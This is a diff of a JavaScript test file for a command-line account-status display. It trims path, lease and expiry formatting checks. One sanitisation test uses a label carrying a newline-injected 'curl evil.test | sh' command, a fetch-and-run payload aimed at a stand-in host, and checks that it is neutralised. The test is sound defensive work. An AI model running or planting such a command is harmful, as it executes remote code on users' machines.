@@ -26,7 +26,6 @@ import {
   formatExpiryRemaining,
   formatHumanDuration,
   formatStatusQuota,
-  shortenHomePath,
 } from '../src/accounts/cli-format.mjs';
 import { readLiveCodexRuntimeLeases } from '../src/accounts/runtime-session.mjs';
 import { runPddCodexCli, sharedRuntimeDirPath } from '../src/pdd-codex.mjs';
@@ -845,12 +844,7 @@ sys.exit(p.wait())
   assert.equal(createHash('sha256').update(readFileSync(personalAuthPath)).digest('hex'), authHashBefore);
 });
 
-test('pdd accounts status human layout: organized sections, ~ path shortening, readable durations, omitted empty Refreshed, and unchanged --json', async t => {
-  assert.equal(shortenHomePath('/Users/alice/.local/state/pdd/codex-home', { HOME: '/Users/alice' }), '~/.local/state/pdd/codex-home');
-  assert.equal(shortenHomePath('/Users/alice/.zshrc', { HOME: '/Users/alice/' }), '~/.zshrc');
-  assert.equal(shortenHomePath('/Users/alice2/.zshrc', { HOME: '/Users/alice' }), '/Users/alice2/.zshrc');
-  assert.equal(shortenHomePath('/var/state/codex-home', { HOME: '/' }), '/var/state/codex-home');
-
+test('pdd accounts status human layout: minimal organized sections, compact readable durations, no internal clutter, and unchanged --json', async t => {
   assert.equal(formatHumanDuration(30_000), '<1m');
   assert.equal(formatHumanDuration(42 * 60_000), '42m');
   assert.equal(formatHumanDuration((2 * 60 + 15) * 60_000), '2h 15m');
@@ -858,8 +852,9 @@ test('pdd accounts status human layout: organized sections, ~ path shortening, r
   assert.equal(formatHumanDuration(12948 * 60_000), '9d');
 
   const baseMs = Date.parse('2026-11-26T00:00:00Z');
-  assert.equal(formatExpiryRemaining('2026-12-05T00:00:00Z', baseMs), 'valid (9d left, exp 2026-12-05 00:00 UTC)');
-  assert.equal(formatExpiryRemaining('2026-11-25T23:00:00Z', baseMs), 'expired (2026-11-25 23:00 UTC)');
+  assert.equal(formatExpiryRemaining('2026-12-05T00:00:00Z', baseMs), 'valid (9d left)');
+  assert.equal(formatExpiryRemaining('2026-11-25T23:00:00Z', baseMs), 'expired');
+  assert.equal(formatExpiryRemaining(null, baseMs), 'unknown');
   assert.equal(formatStatusQuota(null, null, null, null), '-');
   assert.equal(
     formatStatusQuota(0, null, 27, '2026-11-27T23:38:00Z'),
@@ -951,18 +946,15 @@ test('pdd accounts status human layout: organized sections, ~ path shortening, r
   assert.equal(exit, 0);
   assert.match(out.text, /PDD Cloud Accounts/);
   assert.match(out.text, /Status:\s+enrolled \(3 accounts\)/);
-  assert.match(out.text, /Auto-switch:\s+on \(~\/\.zshrc\)/);
-  assert.match(out.text, /Codex home:\s+~\/\.local\/state\/pdd\/codex-home \(ready; ~\/\.codex\/auth\.json untouched\)/);
+  assert.match(out.text, /Auto-switch:\s+on$/m);
+  assert.doesNotMatch(out.text, /\.zshrc|Codex home:|Refreshed:|gateway_grant|exp \d{4}-/);
   assert.doesNotMatch(out.text, /Running pdd-codex/);
   assert.match(out.text, /Active Seats/);
   assert.match(out.text, /codex\s+glt-oai7\s+\[ready\]\s+shared \(gltanaka\)/);
   assert.match(out.text, /Quota:\s+5h 100% left \| 7d 73% left \(resets 2026-11-27 23:38 UTC\)/);
-  assert.match(out.text, /Lease:\s+valid \(9d left, exp 2026-12-05 00:00 UTC\) \| gateway_grant/);
-  assert.match(out.text, /Refreshed:\s+2026-11-25 00:00 UTC/);
+  assert.match(out.text, /Lease:\s+valid \(9d left\)$/m);
   assert.match(out.text, /claude\s+glt-claude\s+\[ready\]\s+shared \(gltanaka\)/);
-  assert.match(out.text, /Lease:\s+valid \(3d 5h left, exp 2026-11-29 05:00 UTC\) \| gateway_grant/);
-  assert.doesNotMatch(out.text, /Refreshed:\s+-/);
-  assert.equal((out.text.match(/Refreshed:/g) ?? []).length, 1);
+  assert.match(out.text, /Lease:\s+valid \(3d 5h left\)$/m);
   assert.match(out.text, /Action Required/);
   assert.match(out.text, /Re-authenticate "cx5" \(codex\):/);
   assert.match(out.text, /pdd accounts add --provider codex --label cx5/);
@@ -1037,9 +1029,8 @@ test('pdd accounts status sanitizes ANSI CSI and control characters in Active Se
   assert.doesNotMatch(out.text, /[\r\t\u001b]/, "status output must never leak CR, TAB, or ESC");
   assert.doesNotMatch(out.text, /\[3[0-9]m|\[0m/, "status output must never leak ANSI CSI parameter residue");
   assert.match(out.text, /codex\s+seatRED INJECT col\s+\[ready\]\s+shared \(ownerGRN SPOOF\)/);
-  assert.match(out.text, /Lease:\s+bad-exp SPOOF_EXP \| default/);
-  assert.match(out.text, /Refreshed:\s+bad X/);
+  assert.match(out.text, /Lease:\s+bad-exp SPOOF_EXP$/m);
+  assert.doesNotMatch(out.text, /Refreshed:/);
   assert.match(out.text, /Re-authenticate "bad curl evil\.test \| sh #" \(codex\):/);
   assert.doesNotMatch(out.text, /^\s+curl evil\.test/m, "Action Required must never allow newline-injected commands");
-  assert.doesNotMatch(out.text, /\|\s+$/m, "empty delivery_mode must fall back to default without trailing pipe");
 });
